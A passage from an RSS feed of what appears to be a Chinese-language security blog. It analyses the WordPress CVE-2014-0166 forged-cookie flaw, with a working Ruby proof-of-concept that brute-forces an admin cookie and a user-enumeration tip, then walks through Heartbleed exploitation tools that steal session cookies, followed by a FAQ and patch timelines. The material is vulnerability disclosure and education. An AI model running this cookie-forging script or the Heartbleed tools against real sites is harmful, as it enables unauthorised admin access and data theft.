  &lt;span class=&quot;sd&quot;&gt;/**&lt;/span&gt;
&lt;span class=&quot;sd&quot;&gt;   * Fires if a bad authentication cookie hash is encountered.&lt;/span&gt;
&lt;span class=&quot;sd&quot;&gt;   *&lt;/span&gt;
&lt;span class=&quot;sd&quot;&gt;   * @since 2.7.0&lt;/span&gt;
&lt;span class=&quot;sd&quot;&gt;   *&lt;/span&gt;
&lt;span class=&quot;sd&quot;&gt;   * @param array $cookie_elements An array of data for the authentication cookie.&lt;/span&gt;
&lt;span class=&quot;sd&quot;&gt;   */&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;do_action&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;auth_cookie_bad_hash&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$cookie_elements&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;問題主要發生在比較運算子 != 上面，!= 運算子是 non-strict，會在比較前先做型態轉換，所以下面看似應該是回傳 true 的例子，全部都顯示為 false，細節請參閱&lt;a href=&quot;http://www.php.net/manual/en/language.operators.comparison.php&quot;&gt;官方手冊&lt;/a&gt;。&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;nb&quot;&gt;var_dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;a&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 0 != 0 -&amp;gt; false&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;var_dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;1&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;01&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 1 != 1 -&amp;gt; false&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;var_dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;10&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;1e1&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 10 != 10 -&amp;gt; false&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;var_dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;1e2&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 100 != 100 -&amp;gt; false&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;var_dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;0&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;0e10123456789012345678901234567890&amp;quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 0 != 0 -&amp;gt; false&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;進入正題，WordPress 認證身分用的 cookie 內容是這樣的：『username|expiration|hmac』。&lt;br /&gt;&lt;br /&gt;
username 是使用者名稱，&lt;br /&gt;&lt;br /&gt;
expiration 是有效期限(timestamp)，&lt;br /&gt;&lt;br /&gt;
hmac 值用來驗證 cookie 是否合法。&lt;br /&gt;&lt;br /&gt;
從上面程式碼可以看到，hmac 的算法是經過 username、pass_frag、expiration、key 綜合得出。若有辦法控制 cookie 中的 hmac 使伺服器認為該 cookie 合法，就可以成功偽造成 username。&lt;/p&gt;

&lt;p&gt;利用稍早提到的比較運算子問題，若我們讓 cookie 中的 hmac 值為 0，很有可能讓判斷式變成下面這樣：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;c1&quot;&gt;//if ( $hmac != $hash ) {&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;0&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;0e10123456789012345678901234567890&amp;quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;do_action&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;auth_cookie_bad_hash&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$cookie_elements&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;如此便可以通過驗證，成功偽造合法 cookie。&lt;br /&gt;&lt;br /&gt;
而為了讓 $hash == 0，可以不斷改變 cookie 中的 expiration，讓產生的 MD5 值($hash)經過型態轉換後剛好變成 0。&lt;br /&gt;&lt;br /&gt;
符合 $hash == 0 的 MD5 $hash 值有 &lt;br /&gt;
0eXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX、00eXXXXXXXXXXXXXXXXXXXXXXXXXXXXX….000000000000000000000000000eX、00000000000000000000000000000 (X = 0,1,2,3,4,5,6,7,8,9)&lt;/p&gt;

&lt;p&gt;故出現 $hash == 0 的機率為 Sum(10^n,n=0,30)/16^32 = 3.265262085617465e-09&lt;/p&gt;

&lt;p&gt;每次偽造的成功機率約為三億分之一，並不會很高，但已經足夠在一個月內拿到最高權限，而且所耗成本並不會很高。&lt;/p&gt;

&lt;h3 id=&quot;實驗&quot;&gt;實驗&lt;/h3&gt;

&lt;p&gt;為了驗證此方法之可行性，我們架設了 &lt;a href=&quot;http://tw.WordPress.org/WordPress-3.8.1-zh_TW.zip&quot;&gt;WordPress 3.8.1&lt;/a&gt; 環境。並且寫程式將登入 cookie 中的 hmac 設為 0，不斷調整 expiration 值測試是否已經登入，程式如下：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;httpclient&amp;#39;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;http&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;HTTPClient&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;cookie_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;WordPress_logged_in_de5be3cf9fcea023a1303527e10ea67a&amp;quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;timestamp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;now&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;to_i&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;timestamp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;.timestamp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;800000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;http://domain.my/WordPress/&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kp&quot;&gt;nil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;Cookie&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookie_name&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;=admin%7C&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;%7C0&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;include?&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;logout&amp;#39;&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;admin%7C&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;%7C0&amp;quot;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;註：此程式為 POC，請自行調整為多執行緒版本，不然速度會很慢。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;經過一段長時間的等待，得到的結果如下：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140416/iTerm.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140416/iTerm.png&quot; alt=&quot;暴力偽造 cookie，直到成功登入&quot; title=&quot;暴力偽造 cookie，直到成功登入&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;得知當 cookie 中的 username 為 admin 且 expiration 值為 1421818232 時，伺服器算出來的 hmac 經過型態轉換會變成 0。我們將測試成功的 cookie 值： admin%7C1421818232%7C0 貼到瀏覽器上。成功變成 admin 如下圖，實驗成功！&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140416/Mantra1.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140416/Mantra1.png&quot; alt=&quot;利用偽造的 cookie 登入 WordPress&quot; title=&quot;利用偽造的 cookie 登入 WordPress&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;註：一般狀況，若不知道 WordPress 最高權限的帳號，可以利用 WordPress 的 feature 在 http://your.WordPress.com/?author=$id ($id: 1,2,3,4…,999,…) 頁面中列舉所有使用者帳號。通常 $id = 1 的 author 都有 WordPress 的管理權限。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;結論&quot;&gt;結論&lt;/h3&gt;

&lt;p&gt;最近出現了一個高風險通報 CVE-2014-0166，其中提及 WordPress 在舊版驗證 cookie 的部分出現弱點，可以偽造合法 cookie，進而取得 WordPress 管理權限。本文分析了其原理，並且證實之。&lt;/p&gt;

&lt;p&gt;對於攻擊者而言，雖然每次偽造 cookie 成功的機率約為三億分之一並不高，但發送三億個 request 後或許能拿到最高權限，已經是值得投資的級數。&lt;/p&gt;

&lt;p&gt;對於 WordPress 管理者而言，建議立即更新至 3.8.2 以後版本，以免受到此風險攻擊。&lt;/p&gt;

&lt;p&gt;從此事件也提醒了 PHP 開發者，在撰寫重要的驗證行為，要特別注意 PHP 比較運算子的特性，請使用 === (不等於請用 !==)來保證等式左右型態與值為一樣，避免因為轉型造成的資安風險。&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2014/04/16/cve-2014-0166-wordpress-forged-cookie-vulnerabilities/</link>
                <guid>https://devco.re/blog/2014/04/16/cve-2014-0166-wordpress-forged-cookie-vulnerabilities</guid>
                <pubDate>Wed, 16 Apr 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>OpenSSL Heartbleed 全球駭客的殺戮祭典，你參與了嗎？</title>
                <description>&lt;p&gt;你跟上了 OpenSSL Heartbleed 的祭典了嗎？如果還沒有，別忘記詳細閱讀一下我們的前文「&lt;a href=&quot;http://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160/&quot;&gt;OpenSSL CVE-2014-0160 Heartbleed 嚴重漏洞&lt;/a&gt;」。&lt;/p&gt;

&lt;p&gt;這幾天不少企業、民眾都不斷來詢問我們相對應的解決方案：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Heartbleed 跟我有關嗎？我該怎麼知道？&lt;/li&gt;
  &lt;li&gt;我該怎麼更新 OpenSSL？&lt;/li&gt;
  &lt;li&gt;我如果不能更新，要怎麼防止攻擊？&lt;/li&gt;
  &lt;li&gt;Heartbleed 漏洞攻擊者會怎麼利用？&lt;/li&gt;
  &lt;li&gt;目前受害的狀況如何？&lt;/li&gt;
  &lt;li&gt;我只是一般民眾，該如何應對？&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我相信不少人都有類似的疑問，我們以這篇專文補遺上次沒提到的資訊。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;攻擊手法示範&quot;&gt;攻擊手法示範&lt;/h3&gt;

&lt;p&gt;大家都說 OpenSSL Heartbleed 漏洞可望為本年度最嚴重的漏洞，到底有多嚴重呢？我相信沒有看到攻擊的範例是沒有感覺的。大家可以先看看以下的影片，利用最先釋出的兩個簡單的 PoC exploit （弱點利用程式）「ssltest.py」以及「check-ssl-heartbleed.pl」，來檢測伺服器是否有 Heartbleed 問題。檢測的同時可以獲取伺服器記憶體中的資訊，其中就可能包含了機敏資訊。&lt;/p&gt;

&lt;p&gt;讓我們來看看吧！&lt;/p&gt;

&lt;center&gt;&lt;div class=&quot;videowrapper&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;420&quot; src=&quot;https://www.youtube.com/embed/kFGzu0-cIxE&quot; frameborder=&quot;0&quot;&gt; &lt;/iframe&gt;&lt;/div&gt;&lt;/center&gt;

&lt;p&gt;首先利用 &lt;a href=&quot;http://pastebin.com/WmxzjkXJ&quot;&gt;ssltest.py&lt;/a&gt; 來測試，來看伺服器是否有被 heartbleed 漏洞影響，fbi.gov 在第三天已經修復這個問題。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-01-ssltest.py.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-01-ssltest.py.png&quot; alt=&quot;利用 ssltest.py 來測試伺服器是否有 Heartbleed 漏洞。&quot; title=&quot;利用 ssltest.py 來測試伺服器是否有 Heartbleed 漏洞。&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;如果是檢測一個有漏洞的網站，這個工具會直接把記憶體的內容顯示出來，其中可能包括 http 傳輸的資料、帳號密碼、私密金鑰等。在這個例子中，攻擊程式讀取到使用者送出的 form，若其中包含個資將會被一覽無遺，非常危險。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-02-ssltest.py-data.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-02-ssltest.py-data.png&quot; alt=&quot;利用 ssltest.py 抓出記憶體中的資料，其中包括 HTTP 傳輸內容。&quot; title=&quot;利用 ssltest.py 抓出記憶體中的資料，其中包括 HTTP 傳輸內容。&quot; /&gt;&lt;br /&gt;
&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;另一個工具 &lt;a href=&quot;https://github.com/noxxi/p5-scripts/blob/master/check-ssl-heartbleed.pl&quot;&gt;check-ssl-heartbleed.pl&lt;/a&gt; 可以使用 -R 參數做更有效的利用。直接執行指令可以快速顯示伺服器有無問題。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-03-check-ssl-heartbleed.pl.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-03-check-ssl-heartbleed.pl.png&quot; alt=&quot;利用 check-ssl-heartbleed.pl 來檢查伺服器是否有 heartbleed 問題。&quot; title=&quot;利用 check-ssl-heartbleed.pl 來檢查伺服器是否有 heartbleed 問題。&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;如果使用「-R」參數並且指定特定的正規表示式，可以抓出想要獲取的資料。例如 Cookie、帳號密碼等。以此例，我們知道這個網站提供 &lt;a href=&quot;http://www.phpmyadmin.net&quot;&gt;phpMyAdmin&lt;/a&gt; 套件，因此直接鎖定「pmaPass」資料來抓取，沒想到第一次就抓到了。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-04-check-ssl-heartbleed.pl-data.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-04-check-ssl-heartbleed.pl-data.png&quot; alt=&quot;利用 check-ssl-heartbleed.pl 抓出特定機敏資料。&quot; title=&quot;利用 check-ssl-heartbleed.pl 抓出特定機敏資料。&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;接著攻擊者只要把這個獲取到的 Cookie 存入自己的瀏覽器中，就可以如影片中盜用這個帳號。是否很危險呢？&lt;/p&gt;

&lt;p&gt;除了這種利用方法之外，還有更多情況是直接把使用者登入的帳號密碼直接顯示出來的，因此如果伺服器沒有做好防禦或更新，整個網站的使用者資料都可以因此外洩。這也是為什麼我們一直強調伺服器管理者必須要更新金鑰、全站使用者帳號密碼等，以防有心人士借此撈取資料。&lt;/p&gt;

&lt;h3 id=&quot;誰在利用-heartbleed-漏洞竊取資料呢&quot;&gt;誰在利用 Heartbleed 漏洞竊取資料呢？&lt;/h3&gt;

&lt;p&gt;由 github 上面的 &lt;a href=&quot;https://github.com/openssl/openssl/commit/4817504d069b4c5082161b02a22116ad75f822b1&quot;&gt;commit 記錄&lt;/a&gt;，出問題的那行程式碼是在 2011-12-31 22:59:57 commit 的，不知道是開發者太累還是 NSA 的陰謀。根據 Bloomberg 的&lt;a href=&quot;http://www.bloomberg.com/news/2014-04-11/nsa-said-to-have-used-heartbleed-bug-exposing-consumers.html&quot;&gt;報導&lt;/a&gt;指出，知情人士表示 NSA 早在&lt;strong&gt;兩年前&lt;/strong&gt;就已經知道此漏洞，並且&lt;strong&gt;利用這個漏洞竊取許多網站的機敏資料&lt;/strong&gt;。這代表 NSA 在一開始就知道這個漏洞，令人不禁有其他聯想。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;The U.S. National Security Agency knew for at least two years about a flaw in the way that many websites send sensitive information, now dubbed the Heartbleed bug, and regularly used it to gather critical intelligence, two people familiar with the matter said.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;在之前&lt;a href=&quot;http://hitcon.org&quot;&gt;台灣駭客年會 (HITCON)&lt;/a&gt; 2013 的講師 Rahul Sasi (Garage4Hackers) 公布了&lt;a href=&quot;https://bitbucket.org/fb1h2s/cve-2014-0160/src/bba16b3eedef0e92bd91fea496b00c92eb515e29/Heartbeat_scanner.py?at=master&quot;&gt;大量掃描 Heartbleed 漏洞的程式&lt;/a&gt;，也可以供研究人員自行研究，或者是尋找自己管理的主機中有多少包含這個風險的。&lt;/p&gt;

&lt;h3 id=&quot;常見問題&quot;&gt;常見問題&lt;/h3&gt;

&lt;h3 id=&quot;openssl-是什麼iis-會受-heartbleed-漏洞影響嗎&quot;&gt;OpenSSL 是什麼？IIS 會受 Heartbleed 漏洞影響嗎？&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://www.openssl.org&quot;&gt;OpenSSL&lt;/a&gt; 是一個函式庫（Library），在 UNIX 系列的服務若有使用 SSL，通常都會使用 OpenSSL。因此這次的漏洞並未影響微軟 IIS。&lt;/p&gt;

&lt;h3 id=&quot;我使用-openssl-098太好了我用舊版我好安全&quot;&gt;我使用 OpenSSL 0.9.8，太好了我用舊版我好安全！&lt;/h3&gt;

&lt;p&gt;你聽過 &lt;a href=&quot;http://en.wikipedia.org/wiki/Transport_Layer_Security#BEAST_attack&quot;&gt;BEAST&lt;/a&gt;, &lt;a href=&quot;http://en.wikipedia.org/wiki/BREACH_%28security_exploit%29&quot;&gt;BREACH&lt;/a&gt;, &lt;a href=&quot;http://en.wikipedia.org/wiki/CRIME_%28security_exploit%29&quot;&gt;CRIME&lt;/a&gt;, &lt;a href=&quot;http://www.isg.rhul.ac.uk/tls/Lucky13.html&quot;&gt;Lucky 13&lt;/a&gt; 嗎？&lt;/p&gt;

&lt;h3 id=&quot;我沒有使用-https所以我很安全&quot;&gt;我沒有使用 HTTPS，所以我很安全！&lt;/h3&gt;

&lt;p&gt;。。。&lt;/p&gt;

&lt;h3 id=&quot;只有網頁伺服器http-server會受影響嗎&quot;&gt;只有網頁伺服器（HTTP Server）會受影響嗎？&lt;/h3&gt;

&lt;p&gt;不只！只要使用 OpenSSL 支援 STARTTLS 的服務都在影響範圍，包括 HTTPS、IMAPS、POPS、SMTPS 等伺服器。&lt;/p&gt;

&lt;h3 id=&quot;只有自己架設的伺服器會受影響嗎&quot;&gt;只有自己架設的伺服器會受影響嗎？&lt;/h3&gt;

&lt;p&gt;當然不只！目前已經出現各大設備廠商都遭遇到這樣的問題。各大設備廠商、作業系統等影響狀況，可以參閱以下文章。&lt;/p&gt;

&lt;p&gt;CERT: OpenSSL heartbeat extension read overflow discloses sensitive information&lt;br /&gt;
&lt;a href=&quot;http://www.kb.cert.org/vuls/byvendor?searchview&amp;amp;Query=FIELD+Reference=720951&amp;amp;SearchOrder=4&quot;&gt;http://www.kb.cert.org/vuls/byvendor?searchview&amp;amp;Query=FIELD+Reference=720951&amp;amp;SearchOrder=4&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;廠商的設備目前狀況特別嚴重，因為所有同個版本的設備都會受影響，而在廠商釋出更新之前，只能被動的等待更新。若沒有繼續簽訂維護約的設備，也只能繼續跟廠商簽約更新，或者是看廠商是否可以直接提供更新檔。如果有 VPN Server 等服務更要注意，如果被攻擊者取得帳號密碼，等於如入無人之境，直接使用你的帳號登入到企業內網，不可不慎。&lt;/p&gt;

&lt;h3 id=&quot;各家系統更新的速度&quot;&gt;各家系統更新的速度？&lt;/h3&gt;

&lt;p&gt;引述自好朋友 Ant 的&lt;a href=&quot;http://blog.gcos.me/2014-04-10_openssl-cve-2014-0160-security-issue.html&quot;&gt;文章&lt;/a&gt;，各家作業系統、網站的更新速度，代表著企業重視資安的程度以及針對資安事件緊急應變的效率，也可以作為我們挑選系統、網站、廠商的依據。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;二、作業系統的更新進度&lt;/p&gt;

  &lt;p&gt;從資安事件的處理可以推敲出各作業系統商對於緊急事件的反應速度。&lt;br /&gt;
時間軸，按照修復的先後排列：&lt;/p&gt;

  &lt;ol&gt;
    &lt;li&gt;OpenSSL (資安弱點的主角) 第一次公開揭露的時間約在 2014年4月6日 0時。&lt;/li&gt;
    &lt;li&gt;RedHat 在 2014年4月7日 07:47:00 正式修復。&lt;/li&gt;
    &lt;li&gt;OpenSSL 正式確認並修復的時間約在 2014年4月7日16時。&lt;/li&gt;
    &lt;li&gt;OpenBSD 約在 2014年4月7日 20:17 正式修復。&lt;/li&gt;
    &lt;li&gt;Arch Linux 約在 2014年4月7日 20:36 正式修復。&lt;/li&gt;
    &lt;li&gt;Debian 約在 2014年4月7日 21:45 正式修復。&lt;/li&gt;
    &lt;li&gt;FreeBSD 約在 2014年4月7日 21:46 正式修復。&lt;/li&gt;
    &lt;li&gt;Ubuntu 約在 2014年4月7日 21:48 正式修復。&lt;br /&gt;
(2014年4月8日分隔區)&lt;/li&gt;
    &lt;li&gt;Fedora 約在 2014年4月8日 00:33 正式修復。&lt;/li&gt;
    &lt;li&gt;CentOS 約在 2014年4月8日 02:49 正式修復。&lt;/li&gt;
    &lt;li&gt;OpenSUSE 約在 2014年4月8日 05:32 正式修復。&lt;/li&gt;
    &lt;li&gt;Scentific 約在 2014年4月8日 08:27 正式修復。&lt;/li&gt;
    &lt;li&gt;Gentoo 約在 2014年4月8日 09:36 正式修復。&lt;/li&gt;
  &lt;/ol&gt;

  &lt;p&gt;重點整理：&lt;/p&gt;
  &lt;ol&gt;
    &lt;li&gt;RedHat 修復的速度比 OpenSSL 官方還快。&lt;/li&gt;
    &lt;li&gt;RedHat 派系的修復時間，除了 RedHat 外都算慢，如 Fedora 及 CentOS、Scentific，他們都比 RedHat 慢 16 小時以上。&lt;/li&gt;
    &lt;li&gt;Debian 派系的修復時間，如 Debian 及 Ubuntu，都比 RedHat 慢上至少 12 小時以上。&lt;/li&gt;
    &lt;li&gt;Gentoo 是列表中修復最慢的。&lt;/li&gt;
    &lt;li&gt;若以資安黃金 6 小時來說，Fedora、CentOS、OpenSUSE、Scentific 及 Gentoo 都不及格。&lt;/li&gt;
  &lt;/ol&gt;

  &lt;p&gt;三、大公司更新的速度&lt;/p&gt;

  &lt;p&gt;同樣地，從資安事件的處理可以推敲出各公司對於緊急事件的反應速度。&lt;/p&gt;

  &lt;p&gt;雲端相關公司&lt;/p&gt;
  &lt;ul&gt;
    &lt;li&gt;Cloudflare 約在 2014年4月7日 11時修復。&lt;/li&gt;
    &lt;li&gt;DigitalOcean 約在 2014年4月8日 12時修復。&lt;/li&gt;
    &lt;li&gt;AWS 約在 2014年4月8日 12時修復。&lt;/li&gt;
    &lt;li&gt;Linode 約在 2014年4月8日 14時修復。&lt;/li&gt;
    &lt;li&gt;Heroku 約在 2014年4月8日 16時修復。&lt;/li&gt;
  &lt;/ul&gt;

  &lt;p&gt;有些公司直到 2014年4月8日 16時都還沒修復。此時已離官方正式修復整整一天，也比上述機器數很多的雲端相關公司還慢。這些公司為，&lt;/p&gt;
  &lt;ul&gt;
    &lt;li&gt;Yahoo.com / Flickr.com&lt;/li&gt;
    &lt;li&gt;Kaspersky.com (資安公司)&lt;/li&gt;
